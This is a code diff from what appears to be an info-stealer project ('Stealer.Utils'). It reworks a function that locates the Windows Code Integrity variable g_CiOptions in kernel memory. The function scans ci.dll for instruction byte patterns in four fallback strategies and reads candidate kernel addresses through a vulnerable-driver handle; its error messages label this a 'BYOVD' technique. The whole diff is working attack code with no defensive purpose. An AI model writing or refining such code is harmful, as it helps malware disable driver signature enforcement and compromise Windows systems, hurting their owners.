@@ -405,61 +405,102 @@ namespace Stealer.Utils
 
             try
             {
-                uint textRva, textSize, dataRva, dataSize;
-                if (!GetModuleSections(userCiBase, out textRva, out textSize, out dataRva, out dataSize))
+                int e_lfanew = Marshal.ReadInt32(new IntPtr(userCiBase.ToInt64() + 0x3C));
+                IntPtr ntHeaders = new IntPtr(userCiBase.ToInt64() + e_lfanew);
+                int sizeOfImage = Marshal.ReadInt32(new IntPtr(ntHeaders.ToInt64() + 0x50));
+
+                if (sizeOfImage <= 0 || sizeOfImage > 10 * 1024 * 1024)
+                    sizeOfImage = 0x100000; // Default 1MB fallback
+
+                byte[] imageCode = new byte[sizeOfImage];
+                Marshal.Copy(userCiBase, imageCode, 0, sizeOfImage);
+
+                // Strategy 1: Scan whole image for mov dword ptr [g_CiOptions], 6
+                // C7 05 XX XX XX XX 06 00 00 00
+                for (int i = 0; i < sizeOfImage - 10; i++)
                 {
-                    textRva = 0x1000; textSize = 0x40000;
-                    dataRva = 0x40000; dataSize = 0x10000;
-                }
-
-                IntPtr userTextStart = new IntPtr(userCiBase.ToInt64() + textRva);
-                IntPtr kernelDataStart = new IntPtr(ciKernelBase.ToInt64() + dataRva);
-                IntPtr kernelDataEnd = new IntPtr(kernelDataStart.ToInt64() + dataSize + 0x4000);
-
-                byte[] code = new byte[textSize];
-                Marshal.Copy(userTextStart, code, 0, (int)textSize);
-
-                for (int i = 0; i < (int)textSize - 10; i++)
-                {
-                    int rel = 0;
-                    IntPtr nextInstr = IntPtr.Zero;
-
-                    // 1. mov [g_CiOptions], 6 -> C7 05 XX XX XX XX 06 00 00 00
-                    if (code[i] == 0xC7 && code[i + 1] == 0x05 &&
-                        code[i + 6] == 0x06 && code[i + 7] == 0x00 && code[i + 8] == 0x00 && code[i + 9] == 0x00)
+                    if (imageCode[i] == 0xC7 && imageCode[i + 1] == 0x05 &&
+                        imageCode[i + 6] == 0x06 && imageCode[i + 7] == 0x00 &&
+                        imageCode[i + 8] == 0x00 && imageCode[i + 9] == 0x00)
                     {
-                        rel = BitConverter.ToInt32(code, i + 2);
-                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 10);
-                    }
-                    // 2. cmp [g_CiOptions], 0 / 6 -> 83 3D XX XX XX XX 00 / 06
-                    else if (code[i] == 0x83 && code[i + 1] == 0x3D && (code[i + 6] == 0x00 || code[i + 6] == 0x06))
-                    {
-                        rel = BitConverter.ToInt32(code, i + 2);
-                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 7);
-                    }
-                    // 3. Standard MOV relative (89 05 / 8B 05 / 89 0D / 8B 0D)
-                    else if ((code[i] == 0x89 || code[i] == 0x8B) && ((code[i + 1] & 0xC7) == 0x05 || (code[i + 1] & 0xC7) == 0x0D))
-                    {
-                        rel = BitConverter.ToInt32(code, i + 2);
-                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 6);
-                    }
-                    // 4. REX prefix MOV relative (44/48 89/8B)
-                    else if ((code[i] == 0x44 || code[i] == 0x48) && (code[i + 1] == 0x89 || code[i + 1] == 0x8B) && ((code[i + 2] & 0xC7) == 0x05 || (code[i + 2] & 0xC7) == 0x0D))
-                    {
-                        rel = BitConverter.ToInt32(code, i + 3);
-                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 7);
-                    }
-
-                    if (nextInstr != IntPtr.Zero)
-                    {
+                        int rel = BitConverter.ToInt32(imageCode, i + 2);
+                        IntPtr nextInstr = new IntPtr(userCiBase.ToInt64() + i + 10);
                         IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
                         long offset = userTarget.ToInt64() - userCiBase.ToInt64();
                         IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
 
-                        if (cand.ToInt64() >= kernelDataStart.ToInt64() && cand.ToInt64() < kernelDataEnd.ToInt64())
+                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
+                        if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val & 6) != 0)
                         {
+                            return cand;
+                        }
+                    }
+                }
+
+                // Strategy 2: Scan whole image for cmp dword ptr [g_CiOptions], 6 or 0
+                // 83 3D XX XX XX XX 06 / 00
+                for (int i = 0; i < sizeOfImage - 7; i++)
+                {
+                    if (imageCode[i] == 0x83 && imageCode[i + 1] == 0x3D &&
+                        (imageCode[i + 6] == 0x06 || imageCode[i + 6] == 0x00 || imageCode[i + 6] == 0x0E))
+                    {
+                        int rel = BitConverter.ToInt32(imageCode, i + 2);
+                        IntPtr nextInstr = new IntPtr(userCiBase.ToInt64() + i + 7);
+                        IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
+                        long offset = userTarget.ToInt64() - userCiBase.ToInt64();
+                        IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+
+                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
+                        if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val & 6) != 0)
+                        {
+                            return cand;
+                        }
+                    }
+                }
+
+                // Strategy 3: Scan near exported functions (CiInitialize, CipReportSecurityViolation)
+                string[] exports = new string[] { "CiInitialize", "CiFreePolicyInfo", "CiValidateImageHeader", "CipReportSecurityViolation" };
+                foreach (string exp in exports)
+                {
+                    IntPtr proc = GetProcAddress(userCiBase, exp);
+                    if (proc != IntPtr.Zero)
+                    {
+                        long procOffset = proc.ToInt64() - userCiBase.ToInt64();
+                        int searchLen = 0x800;
+                        for (int i = (int)procOffset; i < (int)procOffset + searchLen && i < sizeOfImage - 7; i++)
+                        {
+                            if ((imageCode[i] == 0x89 || imageCode[i] == 0x8B) && ((imageCode[i + 1] & 0xC7) == 0x05 || (imageCode[i + 1] & 0xC7) == 0x0D))
+                            {
+                                int rel = BitConverter.ToInt32(imageCode, i + 2);
+                                IntPtr nextInstr = new IntPtr(userCiBase.ToInt64() + i + 6);
+                                IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
+                                long offset = userTarget.ToInt64() - userCiBase.ToInt64();
+                                IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+
+                                uint val = ReadKernelMemory32WithHandle(hDev, cand);
+                                if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val & 6) != 0)
+                                {
+                                    return cand;
+                                }
+                            }
+                        }
+                    }
+                }
+
+                // Strategy 4: Fallback scan all relative MOVs in whole image that point to kernel memory returning 6
+                for (int i = 0; i < sizeOfImage - 7; i++)
+                {
+                    if ((imageCode[i] == 0x89 || imageCode[i] == 0x8B) && ((imageCode[i + 1] & 0xC7) == 0x05 || (imageCode[i + 1] & 0xC7) == 0x0D))
+                    {
+                        int rel = BitConverter.ToInt32(imageCode, i + 2);
+                        IntPtr nextInstr = new IntPtr(userCiBase.ToInt64() + i + 6);
+                        IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
+                        long offset = userTarget.ToInt64() - userCiBase.ToInt64();
+                        if (offset > 0 && offset < sizeOfImage + 0x20000)
+                        {
+                            IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
                             uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                            if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || val == 0x2 || (val != 0 && (val & 6) != 0))
+                            if (val == 6 || val == 0x6 || val == 0xE || val == 0x8)
                             {
                                 return cand;
                             }
@@ -467,7 +508,7 @@ namespace Stealer.Utils
                     }
                 }
 
-                errDetail = "BYOVD: Pattern scan found no g_CiOptions candidate in .text section (ciKernelBase=0x" + ciKernelBase.ToString("X") + ")";
+                errDetail = "BYOVD: All 4 scan strategies found no g_CiOptions in full ci.dll image (size=" + sizeOfImage + ", base=0x" + ciKernelBase.ToString("X") + ")";
                 return IntPtr.Zero;
             }
             finally
